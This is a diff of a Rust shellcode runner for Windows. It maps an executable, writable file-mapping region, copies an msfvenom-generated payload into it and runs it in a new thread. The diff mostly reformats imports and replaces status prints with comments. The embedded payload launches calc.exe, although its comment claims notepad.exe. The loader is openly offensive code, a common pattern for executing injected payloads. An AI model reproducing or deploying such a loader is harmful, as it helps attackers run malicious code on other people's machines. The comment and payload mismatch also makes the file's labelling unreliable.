@@ -1,16 +1,21 @@
 use std::ptr::copy_nonoverlapping;
+use windows::core::Result;
 use windows::Win32::{
     Foundation::{CloseHandle, INVALID_HANDLE_VALUE},
     System::{
         Memory::{
-            CreateFileMappingA, MapViewOfFile, FILE_MAP_EXECUTE, FILE_MAP_WRITE,
+            CreateFileMappingA, MapViewOfFile, 
+            FILE_MAP_EXECUTE, FILE_MAP_WRITE,
             PAGE_EXECUTE_READWRITE,
         },
-        Threading::{CreateThread, WaitForSingleObject, INFINITE, THREAD_CREATION_FLAGS},
+        Threading::{
+            CreateThread, WaitForSingleObject, 
+            INFINITE, THREAD_CREATION_FLAGS
+        },
     },
 };
 
-fn main() -> Result<(), Box<dyn std::error::Error>> {
+fn main() -> Result<()> {
     // msfvenom -p windows/x64/exec CMD=notepad.exe -f rust
     let shellcode: [u8; 276] = [
         0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52,
@@ -33,8 +38,9 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
         0x47, 0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c,
         0x63, 0x2e, 0x65, 0x78, 0x65, 0x00,
     ];
+
     unsafe {
-        println!("[+] Creating a mapping file");
+        // Create a file mapping object (shared memory)
         let hfile = CreateFileMappingA(
             INVALID_HANDLE_VALUE,
             None,
@@ -44,7 +50,7 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
             None,
         )?;
 
-        println!("[+] Mapping the file object");
+        // Map the file object into the process's address space
         let map_address = MapViewOfFile(
             hfile,
             FILE_MAP_WRITE | FILE_MAP_EXECUTE,
@@ -53,9 +59,14 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
             shellcode.len(),
         );
 
-        copy_nonoverlapping(shellcode.as_ptr().cast(), map_address.Value, shellcode.len());
+        // Copy the shellcode into the mapped memory
+        copy_nonoverlapping(
+            shellcode.as_ptr().cast(),
+            map_address.Value,
+            shellcode.len(),
+        );
 
-        println!("[+] Creating a thread");
+        // Create a thread that starts executing at the mapped shellcode
         let hthread = CreateThread(
             None,
             0,
@@ -66,10 +77,9 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
         )?;
 
         println!("[+] Thread Executed!!");
-
         WaitForSingleObject(hthread, INFINITE);
         CloseHandle(hthread)?;
     }
-    
+
     Ok(())
 }
